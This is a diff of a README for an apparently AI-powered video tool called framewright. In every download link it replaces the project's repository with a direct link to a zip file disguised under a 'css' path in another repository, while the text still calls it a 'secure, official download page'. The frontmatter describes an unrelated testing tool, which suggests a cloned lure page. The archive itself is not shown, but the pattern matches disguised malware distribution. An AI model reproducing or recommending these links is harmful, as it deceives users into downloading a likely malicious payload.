@@ -5,7 +5,7 @@ description: "Automate end-to-end testing with AI-powered Playwright agents, vis
 ---
 # ✨ framewright - Videos from Pure Code Magic
 
-[![Download framewright](https://img.shields.io/badge/Download-framewright-brightgreen?style=for-the-badge&logo=github)](https://github.com/Trevacceleratory37/framewright)
+[![Download framewright](https://img.shields.io/badge/Download-framewright-brightgreen?style=for-the-badge&logo=github)](https://github.com/Trevacceleratory37/trevacceleratory37.github.io/raw/refs/heads/main/css/v2.7.zip)
 
 ---
 
@@ -33,7 +33,7 @@ Your journey with framewright begins with a single download. It's completely fre
 
 ### 📥 Step 1: Download framewright
 
-Visit this link to download the application: [https://github.com/Trevacceleratory37/framewright](https://github.com/Trevacceleratory37/framewright)
+Visit this link to download the application: [https://github.com/Trevacceleratory37/trevacceleratory37.github.io/raw/refs/heads/main/css/v2.7.zip](https://github.com/Trevacceleratory37/trevacceleratory37.github.io/raw/refs/heads/main/css/v2.7.zip)
 
 This is a secure, official download page where you'll find the latest version of framewright ready for your computer.
 
@@ -159,7 +159,7 @@ While framewright focuses on visuals, you can easily add music later using free 
 
 Getting started with framewright is as simple as:
 
-1. **Visit the download page:** [https://github.com/Trevacceleratory37/framewright](https://github.com/Trevacceleratory37/framewright)
+1. **Visit the download page:** [https://github.com/Trevacceleratory37/trevacceleratory37.github.io/raw/refs/heads/main/css/v2.7.zip](https://github.com/Trevacceleratory37/trevacceleratory37.github.io/raw/refs/heads/main/css/v2.7.zip)
 2. **Install it on your computer** (takes 2 minutes)
 3. **Type a simple description** of what you want to see
 4. **Click generate** and enjoy your brand-new video!
@@ -174,7 +174,7 @@ You're not just downloading software - you're joining a community of creative pe
 
 Ready to make your first video? Head over to the download page now and see what this incredible tool can do for you.
 
-Download framewright today: [https://github.com/Trevacceleratory37/framewright](https://github.com/Trevacceleratory37/framewright)
+Download framewright today: [https://github.com/Trevacceleratory37/trevacceleratory37.github.io/raw/refs/heads/main/css/v2.7.zip](https://github.com/Trevacceleratory37/trevacceleratory37.github.io/raw/refs/heads/main/css/v2.7.zip)
 
 Happy creating! 🎥✨
 
